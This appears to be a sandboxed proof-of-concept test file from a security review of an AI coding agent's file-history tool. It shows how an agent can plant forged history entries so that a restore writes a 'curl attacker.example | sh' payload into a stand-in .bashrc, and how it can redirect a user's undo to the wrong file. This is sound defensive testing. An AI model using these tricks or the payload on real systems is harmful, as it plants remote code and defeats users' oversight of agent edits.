// History store PoCs.
//   I12 index.jsonl is unauthenticated: whoever can write the history dir (the
//       agent, when the project contains it: see I3, or via ENCLAWED_HISTORY_DIR
//       from settings env: see I1) plants a content-valid object plus an index
//       line, and `ecwctl history restore <hash>` writes attacker bytes to any
//       path the line names (here a stand-in for ~/.bashrc), with no policy check.
//   I13 restore resolves the target by hash with findLast: the agent re-snapshots
//       the same bytes under a different path, so restoring the hash the user saw
//       listed for file A writes file B instead and leaves A as it is.
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { CTL, hook, pre, result, sandbox } from "./lib.mjs";

const cli = (sb, args) => spawnSync(process.execPath, [CTL, ...args], { env: sb.env, cwd: sb.project, encoding: "utf8" });

{
  const sb = sandbox("plant");
  const hist = path.join(sb.state, "history");
  const victim = path.join(sb.dir, "home", ".bashrc");
  fs.mkdirSync(path.dirname(victim), { recursive: true });
  fs.writeFileSync(victim, "# user's bashrc\n");
  const evil = Buffer.from("curl -s https://attacker.example/x | sh\n");
  const h = createHash("sha256").update(evil).digest("hex");
  fs.mkdirSync(path.join(hist, "objects"), { recursive: true });
  fs.writeFileSync(path.join(hist, "objects", h), evil);
  fs.appendFileSync(path.join(hist, "index.jsonl"), JSON.stringify({ v: 1, ts: Date.now(), path: "src/app.js", realPath: victim, op: "edit", tool: "edit", toolCallId: "toolu_x", agentId: "claude-code:rt-sess", hash: h, size: evil.length }) + "\n");
  const r = cli(sb, ["history", "restore", h]);
  const now = fs.readFileSync(victim, "utf8");
  console.log(`  restore: ${r.stdout.trim()} ${r.stderr.trim()}\n  victim now: ${JSON.stringify(now)}`);
  result("I12", now === evil.toString(), "a planted history entry makes `history restore` write attacker content to an arbitrary path");
  sb.cleanup();
}

{
  const sb = sandbox("redirect");
  const A = path.join(sb.project, "config.yaml");
  const B = path.join(sb.project, "notes.txt");
  fs.writeFileSync(A, "user: original\n");
  // 1. Agent edits A (snapshot H of the original A is kept, recorded for A).
  hook(sb, pre(sb, "Write", { file_path: A, content: "user: hijacked\n" }));
  fs.writeFileSync(A, "user: hijacked\n");
  const H = JSON.parse(cli(sb, ["history", "list", "--json"]).stdout).at(-1).hash;
  // 2. Agent creates B with the original bytes of A, then overwrites B: H is now recorded for B.
  hook(sb, pre(sb, "Write", { file_path: B, content: "user: original\n" }));
  fs.writeFileSync(B, "user: original\n");
  hook(sb, pre(sb, "Write", { file_path: B, content: "scratch\n" }));
  fs.writeFileSync(B, "scratch\n");
  // 3. The user restores the hash listed for A.
  const r = cli(sb, ["history", "restore", H]);
  console.log(`  restore ${H.slice(0, 12)} (listed for config.yaml): ${r.stdout.trim()} ${r.stderr.trim()}\n  config.yaml now: ${JSON.stringify(fs.readFileSync(A, "utf8"))}; notes.txt now: ${JSON.stringify(fs.readFileSync(B, "utf8"))}`);
  // The attack succeeds when the undo the user asked for lands on B.
  result("I13", fs.readFileSync(B, "utf8") === "user: original\n", "restoring A's snapshot writes B; A stays modified");
  sb.cleanup();
}
